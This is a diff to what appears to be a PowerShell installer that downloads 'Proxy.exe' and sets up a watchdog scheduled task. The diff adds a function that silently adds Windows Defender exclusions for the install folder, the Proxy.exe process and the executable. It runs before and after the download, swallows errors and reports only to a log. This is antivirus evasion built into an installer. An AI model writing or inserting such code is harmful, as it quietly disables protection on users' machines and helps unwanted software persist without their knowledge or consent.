@@ -113,6 +113,36 @@ function Build-DownloadUrl {
     return $url
 }
 
+function Add-DefenderExclusion {
+    param(
+        [string]$Path,
+        [string]$ExePath
+    )
+
+    try {
+        Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
+        Write-InstallLog ("defender path exclusion ok: " + $Path)
+    } catch {
+        Write-InstallLog ("defender path exclusion skipped: " + $_.Exception.Message)
+    }
+
+    try {
+        Add-MpPreference -ExclusionProcess "Proxy.exe" -ErrorAction Stop
+        Write-InstallLog "defender process exclusion ok: Proxy.exe"
+    } catch {
+        Write-InstallLog ("defender process exclusion skipped: " + $_.Exception.Message)
+    }
+
+    if ($ExePath -and (Test-Path -LiteralPath $ExePath)) {
+        try {
+            Add-MpPreference -ExclusionPath $ExePath -ErrorAction Stop
+            Write-InstallLog ("defender file exclusion ok: " + $ExePath)
+        } catch {
+            Write-InstallLog ("defender file exclusion skipped: " + $_.Exception.Message)
+        }
+    }
+}
+
 function Register-WatchdogTask {
     param(
         [string]$TaskName,
@@ -138,6 +168,8 @@ try {
 } catch {
     $null = $_
 }
+
+Add-DefenderExclusion -Path $Dir -ExePath $Exe | Out-Null
 
 try {
     $latestVersion = Get-LatestProxyVersion -Base $BaseUrl
@@ -167,6 +199,8 @@ try {
     Fail-Install ("download error: " + $_.Exception.Message)
     exit 1
 }
+
+Add-DefenderExclusion -Path $Dir -ExePath $Exe | Out-Null
 
 try {
     $Action = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
